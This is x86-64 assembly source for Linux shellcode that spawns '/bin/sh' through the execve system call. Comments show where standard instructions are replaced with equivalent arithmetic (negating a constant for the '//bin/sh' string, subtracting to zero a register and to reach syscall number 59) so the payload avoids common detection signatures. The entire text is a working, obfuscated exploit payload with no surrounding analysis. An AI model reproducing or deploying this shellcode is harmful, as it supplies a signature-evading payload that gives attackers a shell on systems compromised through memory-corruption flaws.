section .text

global _start
 
_start:
	;xor rdx, rdx
	mov rcx, rdx 
	sub rdx, rcx                        ;This make the same result as zero out the rdx
	;mov qword rbx, '//bin/sh'
	mov qword rbx, -7526411553527181103 ;move the not(hs/nib//) into rbx
	neg rbx                             ;multiply by -1 make it back to hs/nib//
	;;;;;;;;;;;;;
	shr rbx, 0x8
	;;;;;
	push rbx
	mov rdi, rsp
	push rax
	push rdi
	mov rsi, rsp
	;mov al, 0x3b
	mov al, 95                          ;move the 95 in decimal
	sub al, 0x24                        ;subtract 95 by 0x24 in hex result as 0x3b or 59 in decimal
	syscall
